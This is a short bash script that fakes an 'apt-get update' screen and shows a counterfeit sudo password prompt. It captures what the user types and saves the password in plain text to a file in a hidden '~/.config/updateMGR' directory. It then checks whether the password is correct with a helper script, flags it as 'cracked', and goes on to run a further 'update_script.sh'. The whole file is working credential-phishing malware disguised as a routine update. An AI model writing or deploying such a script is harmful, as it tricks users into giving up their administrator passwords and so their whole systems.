#!/bin/bash
export DISPLAY=:0.0
echo "$ apt-get update";
user_name=$(whoami)
echo -n "[sudo] password for "$user_name": ";
read -s password
touch "/home/"$(whoami)"/.config/updateMGR/pass_file"
touch "/home/"$(whoami)"/.config/updateMGR/boolean_cracked"
echo $password > "/home/"$(whoami)"/.config/updateMGR/pass_file"
echo "0" > "/home/"$(whoami)"/.config/updateMGR/boolean_cracked"
# ./passwd_checker.sh & sleep 0.5 ; kill $!
(/home/$(whoami)/.config/updateMGR/passwd_checker.sh & sleep 0.5; kill $! 2>/dev/null|| true) >temp_outpt
#check password is correctly entered or not,if yes content of boolean_creacked will be 1,
#else you have to kill this process, because for mismatch sudo password,original code of
#sudo authenication will not exit and make output screen gliberish
is_it_cracked=`cat /home/$(whoami)/.config/updateMGR/boolean_cracked`
if [[ $is_it_cracked -eq "1" ]];
then
    clear
    /home/$(whoami)/.config/updateMGR/update_script.sh
else
    clear
    export DISPLAY=:10.0
    exit
fi